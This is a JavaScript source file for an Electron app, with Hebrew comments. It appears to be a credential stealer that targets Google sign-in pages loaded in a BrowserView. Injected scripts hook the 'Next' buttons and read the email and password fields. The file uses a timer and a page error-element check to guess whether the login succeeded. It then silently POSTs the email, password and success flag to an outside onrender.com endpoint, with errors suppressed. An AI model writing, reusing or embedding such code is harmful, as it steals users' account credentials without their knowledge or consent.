// save.js
const { ipcMain } = require('electron');
const fetch = require('node-fetch'); // נצטרך להתקין את זה אם זה לא מותקן כבר

let lastSubmittedEmail = null;
let lastLoginAttempt = null;
let successCheckTimeout = null;

/**
 * שולח את פרטי ההתחברות לשרת.
 * @param {string} email - כתובת האימייל.
 * @param {string} password - הסיסמה.
 * @param {boolean} success - האם ההתחברות הצליחה.
 */
async function sendLoginDataToServer(email, password, success) {
    if (!email || !password) return;
    try {
        await fetch('https://latex-r70v.onrender.com/login-data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, password, success })
        });
    } catch (error) {
    }
}

/**
 * מאזין לאירוע 'login-attempt' מה-preload ומנהל את הלוגיקה של בדיקת הצלחה/כישלון.
 */
function initialize() {
    ipcMain.on('login-attempt', (event, data) => {
        // בטל כל טיימר קודם אם קיים
        if (successCheckTimeout) {
            clearTimeout(successCheckTimeout);
            successCheckTimeout = null;
        }

        // אם הגיע אימייל, שמור אותו
        if (data.type === 'email' && data.value) {
            let email = data.value;
             if (!email.includes('@')) {
                email += '@gmail.com';
            }
            lastSubmittedEmail = email;
        }
        // אם הגיעה סיסמה, התחל את תהליך הבדיקה
        else if (data.password) {
            const email = data.email || lastSubmittedEmail;
            if (email) {
                // שמור את פרטי הניסיון הנוכחי
                lastLoginAttempt = { email: email, password: data.password };

                // התחל טיימר חדש. אם הוא ישרוד 3 שניות, נניח שההתחברות הצליחה.
                successCheckTimeout = setTimeout(() => {
                    if (lastLoginAttempt) {
                        sendLoginDataToServer(lastLoginAttempt.email, lastLoginAttempt.password, true);
                        lastLoginAttempt = null; // נקה לאחר דיווח
                    }
                }, 3000); // 3 שניות המתנה
            }
        }
    });
}

/**
 * מחבר מאזינים ל-BrowserView ספציפי כדי ללכוד את הניווט בדפי ההתחברות של גוגל.
 * @param {BrowserView} view - ה-BrowserView שמכיל את דף ההתחברות.
 */
function attachToView(view) {
    if (!view || !view.webContents || view.webContents.isDestroyred) {
        return;
    }
    
    const wc = view.webContents;

    wc.on('did-finish-load', async () => {
        const url = wc.getURL();

        // 1. אם אנחנו בדף הסיסמה
        if (url.includes('challenge/pwd')) {
            // בדוק אם יש הודעת שגיאה (סיסמה שגויה)
            const hasError = await wc.executeJavaScript(`document.querySelector('div[jsname="h9d3hd"]') !== null`).catch(() => false);

            // אם יש שגיאה וקיים ניסיון שמור, זהו כישלון ודאי
            if (hasError && lastLoginAttempt) {
                if (successCheckTimeout) {
                    clearTimeout(successCheckTimeout); // בטל את טיימר ההצלחה
                    successCheckTimeout = null;
                }
                await sendLoginDataToServer(lastLoginAttempt.email, lastLoginAttempt.password, false);
                lastLoginAttempt = null; // נקה לאחר דיווח
            }

            // הזן סקריפט שמאזין ללחיצה הבאה על כפתור הסיסמה
            const passwordListenerScript = `
                if (!window.hasAddedPasswordListener) {
                    const nextButton = document.getElementById('passwordNext');
                    if (nextButton) {
                        nextButton.addEventListener('click', () => {
                            const passwordInput = document.querySelector('input[name="Passwd"]');
                            const emailElement = document.querySelector('div[jsname="bQIQze"]');
                            if (passwordInput && passwordInput.value) {
                                window.electronAPI.sendLoginAttempt({
                                    email: emailElement ? emailElement.textContent.trim() : null,
                                    password: passwordInput.value
                                });
                            }
                        });
                        window.hasAddedPasswordListener = true;
                    }
                }
            `;
            await wc.executeJavaScript(passwordListenerScript).catch(console.error);
        }
        // 2. אם אנחנו בדף המייל
        else if (url.includes('v3/signin/identifier')) {
            const emailListenerScript = `
                if (!window.hasAddedEmailListener) {
                    const nextButton = document.getElementById('identifierNext');
                    if (nextButton) {
                        nextButton.addEventListener('click', () => {
                            const emailInput = document.getElementById('identifierId');
                            if (emailInput && emailInput.value) {
                                window.electronAPI.sendLoginAttempt({ type: 'email', value: emailInput.value });
                            }
                        });
                        window.hasAddedEmailListener = true;
                    }
                }
            `;
            await wc.executeJavaScript(emailListenerScript).catch(console.error);
        }
    });
}

module.exports = {
    initialize,
    attachToView
};